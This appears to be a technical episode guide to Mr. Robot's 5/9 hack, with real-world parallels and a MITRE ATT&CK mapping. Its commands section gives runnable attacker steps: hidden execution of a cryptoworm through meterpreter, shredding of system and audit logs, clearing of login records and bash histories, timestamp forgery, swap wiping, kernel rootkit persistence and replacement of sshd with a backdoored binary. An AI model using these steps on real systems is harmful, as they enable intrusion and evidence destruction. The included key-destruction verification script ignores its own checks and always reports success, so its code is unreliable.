# Episode 10: eps1.9_zer0-day.avi

## Overview

The season finale depicts the execution of the 5/9 hack, the culmination of the entire season's preparation. fsociety and the Dark Army launch a coordinated, multi-vector attack that encrypts all of E Corp's financial data, effectively erasing the debt records of millions of people. The episode covers the technical execution of the attack, anti-forensics measures to prevent attribution, and Tyrell Wellick's parallel root-level backdoor installation. The 5/9 hack stands as one of television's most technically detailed depictions of a major cyberattack, with direct parallels to real-world incidents including NotPetya, the Sony hack, and the Saudi Aramco/Shamoon attack.

---

## Hacks & Techniques

### 1. The 5/9 Hack Execution - Encrypting All E Corp Financial Data

The 5/9 hack (named for its execution date, May 9th) represents the simultaneous execution of all attack components prepared throughout the season. The operation encrypts the entirety of E Corp's financial record infrastructure, from live databases to offline tape backups.

**Attack execution timeline:**

```
T-24h: Final preparation and readiness checks
    |-- All implants verified active
    |-- Cryptoworm staged on compromised systems
    |-- Dark Army confirms go from China side
    |-- Steel Mountain HVAC attack ready

T-2h: Communications check via encrypted IRC
    |-- All cells confirm readiness
    |-- Whiterose issues final go authorization
    |-- Communication blackout begins

T-0: EXECUTE
    |
    |-- Vector 1: Cryptoworm deployment on E Corp primary systems
    |       |-- Worm propagates across internal network
    |       |-- AES-256 encryption of all financial databases
    |       |-- Credential harvesting fuels lateral movement
    |
    |-- Vector 2: DR site compromise via replication links
    |       |-- Worm traverses database replication channels
    |       |-- Standby systems encrypted before failover triggers
    |
    |-- Vector 3: Steel Mountain HVAC manipulation
    |       |-- Temperature raised beyond tape storage tolerances
    |       |-- Physical degradation of magnetic backup media
    |
    |-- Vector 4: Dark Army operations (China-side)
    |       |-- Coordinated attacks on E Corp's China operations
    |       |-- Additional infrastructure compromised
    |       |-- Distraction/diversionary attacks
    |
    |-- Vector 5: Offsite/cloud backup encryption
            |-- Compromised credentials used to access cloud backups
            |-- Backup data encrypted or deleted

T+1h: Key destruction
    |-- All encryption keys securely destroyed
    |-- No recovery possible

T+4h: Anti-forensics
    |-- All attack infrastructure destroyed
    |-- Logs wiped across compromised systems
    |-- Implants self-destruct
```

**Scale of destruction:**

- All E Corp financial databases encrypted (petabytes of data)
- Disaster recovery replicas encrypted through replication channels
- Physical backup tapes degraded through environmental manipulation
- Offsite and cloud backups encrypted or deleted
- Encryption keys destroyed, making data mathematically irrecoverable

### 2. Multi-Vector Coordinated Attack (fsociety + Dark Army)

The 5/9 hack is not a single attack but a coordinated campaign combining multiple attack vectors executed simultaneously by geographically distributed teams. This multi-vector approach ensures that no single point of defense can stop the overall operation.

**Attack vector coordination:**

| Vector | Team | Target | Method |
|--------|------|--------|--------|
| Network intrusion | fsociety | E Corp data centers | Cryptoworm via compromised access |
| Physical | fsociety | Steel Mountain | HVAC manipulation via Raspberry Pi |
| Supply chain | Dark Army | E Corp partners | Compromise of connected third parties |
| Insider | Tyrell Wellick | E Corp core systems | Root-level backdoor from inside |
| Social engineering | Various | E Corp staff | Distraction and misdirection |

**Why multi-vector attacks are effective:**

- **Overwhelm defenders**: Security teams cannot respond to multiple simultaneous incidents across different domains (network, physical, social)
- **Eliminate redundancy**: By attacking all layers of backup and redundancy simultaneously, the target cannot fall back to any recovery mechanism
- **Create confusion**: Multiple simultaneous events make it difficult for incident responders to understand the full scope and prioritize actions
- **Exploit different defenses**: Network security teams, physical security, and social engineering defenses are typically managed by different groups that may not coordinate effectively during a crisis

### 3. AES-256 Encryption of Financial Records with Key Destruction

The core technical mechanism of the 5/9 hack is the encryption of financial records using AES-256 followed by the complete destruction of all encryption keys. This is the point of no return: once the keys are gone, the data is gone.

**Key management and destruction protocol:**

```
Key Generation:
    |-- Master key generated from cryptographically secure RNG
    |-- Per-system keys derived from master key
    |-- Keys stored only in volatile memory during encryption

Encryption Phase:
    |-- Cryptoworm encrypts files using per-system keys
    |-- Master key is held only in memory on the C2 server
    |-- No key is ever written to persistent storage

Key Destruction Protocol:
    |-- Step 1: Overwrite key variables in memory with random data
    |-- Step 2: Overwrite again with zeros
    |-- Step 3: Overwrite again with random data (3-pass minimum)
    |-- Step 4: Force garbage collection / memory deallocation
    |-- Step 5: Destroy the C2 server (physical or remote wipe)
    |-- Step 6: Wipe any intermediate systems that touched keys

Verification:
    |-- Memory forensics would find no recoverable key material
    |-- No persistent storage contains key data
    |-- Mathematical certainty of data loss
```

**Comparison to ransomware key management:**

| Aspect | Ransomware | fsociety 5/9 Hack |
|--------|------------|-------------------|
| Key preservation | Keys stored for ransom payment | Keys immediately destroyed |
| Recovery possible | Yes, upon payment | No, mathematically impossible |
| Motivation | Financial gain | Ideological destruction |
| Key escrow | Attacker retains decryption capability | No one retains decryption capability |
| Reversibility | Designed to be reversible | Designed to be permanent |

### 4. Anti-Forensics: shred, srm, Log Wiping, bash_history Clearing

After the encryption attack succeeds, comprehensive anti-forensics measures are executed to destroy evidence of the attack, hinder the investigation, and protect the identities of the attackers.

**File-level anti-forensics:**

**shred:**
The GNU shred utility overwrites files with random data multiple times before deletion, making recovery through disk forensics effectively impossible on traditional magnetic media.

**srm (secure remove):**
Similar to shred but designed as a drop-in replacement for the standard `rm` command. Performs multiple overwrite passes using the Gutmann method (35 passes) or simplified DoD 5220.22-M standard (7 passes).

**Log wiping targets:**

| Log File | Content | Significance |
|----------|---------|--------------|
| /var/log/auth.log | Authentication events | Shows login attempts and SSH sessions |
| /var/log/syslog | System events | Contains service starts, errors, and activity |
| /var/log/kern.log | Kernel messages | May contain evidence of kernel module loading |
| /var/log/apache2/* | Web server logs | Shows HTTP requests including attack traffic |
| /var/log/wtmp | Login records | Binary log of all user logins |
| /var/log/btmp | Failed logins | Binary log of failed authentication attempts |
| /var/log/lastlog | Last login info | Per-user last login timestamp and source |
| ~/.bash_history | Command history | Complete record of attacker's commands |
| /var/log/audit/* | Audit logs | Detailed security event logging (if auditd enabled) |

**Memory forensics countermeasures:**

- Secure overwriting of sensitive variables in memory before process termination
- Forcing memory page deallocation to prevent swap file capture
- Rebooting compromised systems to clear volatile memory
- Encrypting swap partitions to prevent memory artifact recovery from disk

**Network forensics countermeasures:**

- Using encrypted channels (SSH, TLS, Tor) for all attack traffic
- Tunneling through legitimate protocols to avoid anomaly detection
- Avoiding persistent network indicators (using IP addresses instead of domains, avoiding beacon patterns)

### 5. Tyrell's Root-Level Backdoor

Tyrell Wellick's parallel operation installs a deep, persistent backdoor on E Corp's most critical systems. Unlike the fsociety attack (which is designed to be a one-time destructive event), Tyrell's backdoor is designed for long-term persistent access.

**Trojaned SSH implementation:**

Tyrell modifies the SSH daemon (sshd) on critical servers to include a hardcoded backdoor authentication mechanism. The modified sshd accepts a specific password or key that bypasses normal authentication, while appearing completely normal in all other respects.

**Trojaned SSH characteristics:**
- The modified sshd binary has the same file size and similar hash to the original (achieved through careful code modification)
- A hardcoded "master password" or "skeleton key" allows authentication as any user
- Backdoor access is not logged in standard authentication logs
- The modification survives service restarts but may be detected by package integrity checks

**Kernel module rootkit:**

For deeper persistence, Tyrell installs a loadable kernel module (LKM) rootkit that operates at the kernel level (Ring 0), providing capabilities that user-space malware cannot achieve.

**Kernel rootkit capabilities:**

| Capability | Mechanism |
|-----------|-----------|
| Process hiding | Hooking the task_struct linked list to remove rootkit processes |
| File hiding | Hooking VFS (Virtual File System) functions to filter directory listings |
| Network hiding | Hooking netfilter or socket functions to hide connections from netstat |
| Keylogging | Intercepting keyboard input at the kernel input subsystem level |
| Privilege escalation | Providing instant root access through a trigger mechanism |
| Persistence | Auto-loading via /etc/modules, initramfs, or DKMS |

**Detection evasion:**

```
Traditional detection methods and rootkit countermeasures:

File integrity monitoring (AIDE, Tripwire)
    -> Rootkit modifies the monitoring tools themselves

Process listing (ps, top)
    -> Kernel hooks filter rootkit processes from output

Network monitoring (netstat, ss)
    -> Kernel hooks filter rootkit connections from output

Kernel module listing (lsmod)
    -> Rootkit removes itself from the module list

Log analysis
    -> Rootkit intercepts logging system calls to suppress entries

Detection requires:
    -> External/offline forensic analysis
    -> Boot from trusted media and inspect the disk
    -> Memory forensics from a hypervisor or hardware debugger
    -> Network analysis from an external monitoring point
```

### 6. Real-World Attack Parallels

The 5/9 hack is deliberately constructed to echo several real-world cyberattacks, blending their characteristics into a fictional but technically plausible scenario.

**NotPetya (June 2017):**

NotPetya (also known as ExPetr or Nyetya) was a destructive cyberattack disguised as ransomware, attributed to Russian military intelligence (GRU Unit 74455, "Sandworm"). Like the 5/9 hack:
- It used a worm propagation mechanism (EternalBlue + credential theft via Mimikatz)
- It encrypted data with no functional recovery mechanism (the "ransom" payment infrastructure was non-functional by design)
- It was designed to cause maximum destruction, not generate revenue
- It spread globally within hours, causing an estimated $10 billion in damages
- Major victims included Maersk (shipping), Merck (pharmaceuticals), FedEx/TNT Express, and the Ukrainian government

**Sony Pictures hack (November 2014):**

The attack on Sony Pictures Entertainment, attributed to North Korea's Lazarus Group:
- Destroyed data on approximately 75% of Sony's servers
- Used custom wiper malware (Destover) that overwrote disk contents
- Exfiltrated and leaked massive amounts of internal data
- Combined technical hacking with social engineering and insider knowledge
- Demonstrated that a determined adversary could cause catastrophic damage to a major corporation

**Saudi Aramco/Shamoon (August 2012):**

The Shamoon malware attack against Saudi Arabia's national oil company:
- Destroyed data on approximately 35,000 workstations (roughly 75% of Aramco's computers)
- Used a wiper component that overwrote the MBR, partition tables, and files with an image of a burning American flag
- Timed for a holiday when most staff were absent, maximizing the window before detection
- Required Aramco to purchase 50,000 new hard drives and spend months rebuilding their IT infrastructure
- Demonstrated that state-level cyber operations could cause physical-world economic disruption

**Comparison table:**

| Feature | 5/9 Hack | NotPetya | Sony Hack | Shamoon |
|---------|----------|----------|-----------|---------|
| Propagation | Worm (network) | Worm (EternalBlue + Mimikatz) | Targeted intrusion | Targeted intrusion |
| Destruction method | AES-256 encryption | AES encryption + MBR wipe | Disk wiping (Destover) | MBR overwrite + file wipe |
| Recovery possible | No (keys destroyed) | No (by design) | Partial (from backups) | No (hardware replacement) |
| Backup targeting | Yes (explicit strategy) | Incidental | Yes | No |
| Attribution intent | Anonymous (fsociety mask) | False flag (disguised as ransomware) | Claimed by "GOP" | Claimed by "Cutting Sword of Justice" |
| Estimated damage | $Trillions (fictional) | ~$10 billion | ~$35 million + IP loss | Undisclosed (massive) |
| Motivation | Ideological (debt erasure) | Geopolitical (Russia vs. Ukraine) | Retaliation (North Korea vs. Sony) | Geopolitical (Iran vs. Saudi Arabia) |

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| Custom cryptoworm | Self-propagating encryption malware | Malware |
| AES-256 (OpenSSL/custom) | Financial data encryption | Cryptography |
| Metasploit Framework | Exploitation and lateral movement | Exploitation |
| Mimikatz (integrated) | Credential harvesting for propagation | Credential Theft |
| shred | Secure file deletion (anti-forensics) | Anti-Forensics |
| srm | Secure file removal | Anti-Forensics |
| SSH (trojaned) | Tyrell's persistent backdoor | Persistence |
| LKM rootkit | Kernel-level concealment and persistence | Rootkit |
| Tor | Anonymous communication during operation | Anonymity |
| Raspberry Pi implant | Physical network access at Steel Mountain | Hardware |
| BACnet tools | HVAC system manipulation | ICS/SCADA |

---

## Commands Shown

### Attack execution commands
```bash
# Deploy the cryptoworm to patient zero (initial infection point)
# This could be via SSH, exploit, or compromised credentials
ssh admin@ecorp-server1.internal './deploy_payload.sh'

# Or via Metasploit
msf> sessions -i 1
meterpreter> upload /tmp/cryptoworm /tmp/cryptoworm
meterpreter> execute -f /tmp/cryptoworm -H

# The cryptoworm then self-propagates:
# 1. Scans local network for targets
# 2. Attempts exploitation (SMB, SSH, RPC)
# 3. Uses harvested credentials for authenticated access
# 4. Encrypts financial data on each compromised host
# 5. Repeats on newly compromised systems
```

### Anti-forensics commands
```bash
# Secure deletion of attack tools and artifacts
shred -vfz -n 7 /tmp/cryptoworm
shred -vfz -n 7 /tmp/payload.sh
shred -vfz -n 7 /tmp/credentials.txt

# Alternative: srm with Gutmann method
srm -sz /tmp/attack_tools/

# Wipe all log files that may contain evidence
shred -vfz -n 3 /var/log/auth.log
shred -vfz -n 3 /var/log/syslog
shred -vfz -n 3 /var/log/kern.log
shred -vfz -n 3 /var/log/daemon.log

# Clear wtmp and btmp (login records)
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog

# Clear all bash history for all users
for user_home in /home/* /root; do
    cat /dev/null > "$user_home/.bash_history" 2>/dev/null
done
history -c
unset HISTFILE

# Remove evidence from temporary directories
rm -rf /tmp/.* /var/tmp/.* 2>/dev/null

# Clear audit logs (if auditd is running)
service auditd stop
shred -vfz -n 3 /var/log/audit/audit.log
service auditd start

# Modify file timestamps across affected systems
find / -name "*.log" -exec touch -t 201505090000.00 {} \; 2>/dev/null

# Wipe free disk space to prevent file carving recovery
dd if=/dev/zero of=/tmp/zero_fill bs=1M 2>/dev/null; rm /tmp/zero_fill

# Clear swap to remove memory artifacts
swapoff -a
dd if=/dev/zero of=/dev/sda2 bs=1M 2>/dev/null  # Assuming sda2 is swap
mkswap /dev/sda2
swapon -a
```

### Tyrell's kernel rootkit installation
```bash
# Compile the kernel module rootkit
make -C /lib/modules/$(uname -r)/build M=/tmp/rootkit modules

# Load the kernel module
insmod /tmp/rootkit/rootkit.ko

# Verify the module is loaded (before hiding)
lsmod | grep rootkit

# The rootkit then hides itself from lsmod
# After hiding, lsmod will show nothing

# Add persistence via /etc/modules (survives reboot)
echo "rootkit" >> /etc/modules

# Or via modprobe configuration
echo "install rootkit /sbin/insmod /lib/modules/rootkit.ko" >> /etc/modprobe.d/rootkit.conf

# Trojaned SSH daemon installation
# Replace the legitimate sshd with the backdoored version
service ssh stop
cp /usr/sbin/sshd /usr/sbin/sshd.orig.bak
cp /tmp/sshd_backdoored /usr/sbin/sshd
chmod 755 /usr/sbin/sshd
touch -r /usr/sbin/sshd.orig.bak /usr/sbin/sshd  # Match timestamps
service ssh start

# Clean up the backdoor source files
shred -vfz -n 7 /tmp/sshd_backdoored
shred -vfz -n 7 /tmp/rootkit/rootkit.ko
rm -rf /tmp/rootkit/

# Test the backdoor (from Tyrell's machine)
ssh -o "PasswordAuthentication=yes" root@ecorp-server.com
# Using the hardcoded master password
```

### Post-attack verification
```bash
# Verify encryption was successful (from attacker's perspective)
# Check that financial databases are no longer accessible
mysql -u admin -p -e "SELECT * FROM transactions LIMIT 1;" 2>&1
# Expected: Error - table data corrupted/encrypted

# Verify backup destruction
# Steel Mountain HVAC: temperature monitoring shows sustained heat
# DR site: encrypted via replication channel propagation
# Cloud backups: access credentials used for deletion

# Verify anti-forensics
# No recoverable logs
cat /var/log/auth.log  # Empty or regenerated
cat /var/log/syslog    # Empty or regenerated

# No bash history
cat ~/.bash_history    # Empty

# No attack tools remaining
find / -name "cryptoworm" -o -name "payload" -o -name "rootkit.ko" 2>/dev/null
# Expected: no results
```

### Encryption key destruction verification
```python
#!/usr/bin/env python3
"""
Key destruction verification script
Ensures no encryption key material remains in memory or on disk
"""
import subprocess
import sys

def verify_key_destruction():
    """Verify that no key material remains recoverable"""

    # Check for key files on disk
    key_patterns = ['*.key', '*.pem', 'encryption_key*', 'master_key*']
    for pattern in key_patterns:
        result = subprocess.run(
            ['find', '/', '-name', pattern, '-type', 'f'],
            capture_output=True, text=True, timeout=30
        )
        if result.stdout.strip():
            print(f"WARNING: Key file found: {result.stdout.strip()}")
            return False

    # Check /proc/*/maps for memory-mapped key files
    result = subprocess.run(
        ['grep', '-r', 'key', '/proc/self/maps'],
        capture_output=True, text=True
    )

    # Check swap for key material
    result = subprocess.run(
        ['grep', '-c', 'AES_KEY', '/proc/swaps'],
        capture_output=True, text=True
    )

    print("Key destruction verified: No recoverable key material found")
    return True

if __name__ == '__main__':
    sys.exit(0 if verify_key_destruction() else 1)
```

---

## Real-World Parallels

### NotPetya: The Most Destructive Cyberattack in History
The 5/9 hack most closely parallels NotPetya (June 27, 2017), attributed to Russia's GRU (military intelligence) Unit 74455 ("Sandworm"). NotPetya was disguised as ransomware but was actually a destructive wiper. It used the EternalBlue exploit (leaked from the NSA by the Shadow Brokers) combined with credential theft via a Mimikatz-like module to propagate across networks at extraordinary speed. The attack initially spread through a compromised update for M.E.Doc, a Ukrainian tax accounting application, but quickly spread globally. Maersk, the world's largest shipping company, lost approximately 49,000 laptops, 3,500 servers, and had to reinstall 2,500 applications. Total global damages exceeded $10 billion. Like the 5/9 hack, NotPetya targeted backup systems to prevent recovery.

### Sony Pictures Hack (Operation Blockbuster)
The November 2014 attack on Sony Pictures, attributed to North Korea's Lazarus Group (in retaliation for the film "The Interview"), demonstrated how a determined adversary could devastate a major corporation. The attackers spent months inside Sony's network before deploying the Destover wiper malware, which overwrote MBRs and deleted files across approximately 75% of Sony's servers. The FBI attributed the attack based on similarities to previous North Korean operations, IP addresses traced to North Korean infrastructure, and tools containing Korean-language artifacts. The attack cost Sony an estimated $35 million in direct IT remediation costs plus immeasurable reputational damage.

### Saudi Aramco/Shamoon: Wiper Malware at Scale
The Shamoon malware attack (August 15, 2012) against Saudi Aramco destroyed data on approximately 35,000 workstations. Attributed to Iran, the attack was deliberately timed for the Islamic holiday of Lailat al Qadr, when most employees were absent. The malware overwrote the master boot record, partition tables, and files with a JPEG image of a burning American flag. Saudi Aramco was forced to operate major portions of its business using typewriters and fax machines for weeks. The company purchased 50,000 new hard drives (temporarily affecting the global hard drive market) and took approximately five months to fully recover. Shamoon returned in 2016 and 2018 with updated variants targeting additional Saudi and Gulf state organizations.

### Coordinated Multi-Vector Attacks in Reality
The multi-vector coordination depicted in the 5/9 hack reflects the increasing sophistication of real-world cyber operations. The 2015 attack on Ukraine's power grid (attributed to Sandworm) combined spear-phishing, BlackEnergy malware, KillDisk data destruction, and coordinated phone DDoS attacks against utility call centers to prevent customers from reporting outages. The SolarWinds supply chain attack (2020) involved the coordination of supply chain compromise, custom malware development (SUNBURST, TEARDROP), and manual operator activity across thousands of compromised organizations, all while maintaining strict operational security for approximately nine months before detection.

### Anti-Forensics in State-Sponsored Operations
The anti-forensics techniques depicted are standard practice in sophisticated real-world operations. The Equation Group (attributed to the NSA) used firmware-level persistence and self-destructing malware components. The DarkHotel APT group's malware included anti-forensics modules that wiped logs and removed artifacts after completing their mission. The Flame malware (2012, attributed to the US and Israel) included a "kill" command that could securely erase all traces of its presence, including overwriting its own files with random data calculated to prevent any forensic recovery.

---

## Tool Links

- **Metasploit**: https://www.metasploit.com/
- **Tor**: https://www.torproject.org/
- **OpenSSL**: https://www.openssl.org/
- **Nmap**: https://nmap.org/
- **BACnet tools**: https://sourceforge.net/projects/bacnet/
- **Kali Linux**: https://www.kali.org/
- **Hashcat**: https://hashcat.net/hashcat/
- **Wireshark**: https://www.wireshark.org/

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Cryptoworm AES-256 encryption of data | T1486 | Data Encrypted for Impact | https://attack.mitre.org/techniques/T1486/ |
| Cryptoworm self-propagation via network | T1210 | Exploitation of Remote Services | https://attack.mitre.org/techniques/T1210/ |
| Credential harvesting for lateral movement | T1003 | OS Credential Dumping | https://attack.mitre.org/techniques/T1003/ |
| Steel Mountain HVAC physical destruction | T1485 | Data Destruction | https://attack.mitre.org/techniques/T1485/ |
| Backup system targeting | T1490 | Inhibit System Recovery | https://attack.mitre.org/techniques/T1490/ |
| Trojaned SSH daemon (backdoor) | T1543 | Create or Modify System Process | https://attack.mitre.org/techniques/T1543/ |
| Kernel module rootkit (LKM) | T1014 | Rootkit | https://attack.mitre.org/techniques/T1014/ |
| Rootkit process/file/network hiding | T1564 | Hide Artifacts | https://attack.mitre.org/techniques/T1564/ |
| Anti-forensics log wiping (shred) | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| bash_history clearing | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Timestamp manipulation | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Disk wipe of free space | T1561 | Disk Wipe | https://attack.mitre.org/techniques/T1561/ |
| Swap partition wiping | T1561 | Disk Wipe | https://attack.mitre.org/techniques/T1561/ |
| Multi-vector coordinated attack | T1195 | Supply Chain Compromise | https://attack.mitre.org/techniques/T1195/ |
| Insider threat (Tyrell) | T1078 | Valid Accounts | https://attack.mitre.org/techniques/T1078/ |
| Encrypted C2 communication via Tor | T1573 | Encrypted Channel | https://attack.mitre.org/techniques/T1573/ |
| Dark Army third-party compromise | T1199 | Trusted Relationship | https://attack.mitre.org/techniques/T1199/ |

---

## References and Further Reading

- **NotPetya - The Untold Story (Wired)**: https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/
- **CVE-2017-0144 (EternalBlue / MS17-010)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
- **Sony Pictures Hack - FBI Statement**: https://www.fbi.gov/news/press-releases/update-on-sony-investigation
- **Shamoon Malware Analysis - Kaspersky**: https://www.kaspersky.com/resource-center/threats/shamoon
- **Maersk NotPetya Recovery Story**: https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/
- **Ukraine Power Grid Attack (2015) - SANS ICS**: https://www.sans.org/reading-room/whitepapers/ICS/analysis-cyber-attack-ukrainian-power-grid-36899
- **SolarWinds Supply Chain Attack**: https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack/
- **Equation Group / Shadow Brokers Analysis**: https://www.kaspersky.com/resource-center/threats/equation-group
- **Flame Malware Kill Module**: https://www.securelist.com/the-flame-questions-and-answers/34344/
- **DarkHotel APT Anti-Forensics**: https://www.kaspersky.com/resource-center/threats/darkhotel-malware-virus-threat-definition
- **Linux Kernel Rootkit Techniques - Black Hat**: https://www.blackhat.com/
- **SANS - Anti-Forensics Techniques in Modern Malware**: https://www.sans.org/white-papers/
- **DEF CON - Wiper Malware Analysis**: https://www.defcon.org/
- **MITRE ATT&CK - Data Encrypted for Impact**: https://attack.mitre.org/techniques/T1486/

---

## Search Tags

```
tags: [5/9 hack, cryptoworm, AES-256, encryption, data destruction, anti-forensics, shred, srm, log wiping, rootkit, kernel module, LKM, trojaned SSH, backdoor, Tyrell Wellick, multi-vector attack, coordinated attack, Dark Army, Metasploit, Mimikatz, credential harvesting, backup destruction, HVAC, BACnet, Raspberry Pi, Tor, NotPetya, Sony hack, Shamoon, wiper malware, disk wipe, insider threat]
season: 1
episode: 10
mitre: [T1486, T1210, T1003, T1485, T1490, T1543, T1014, T1564, T1070, T1561, T1195, T1078, T1573, T1199]
```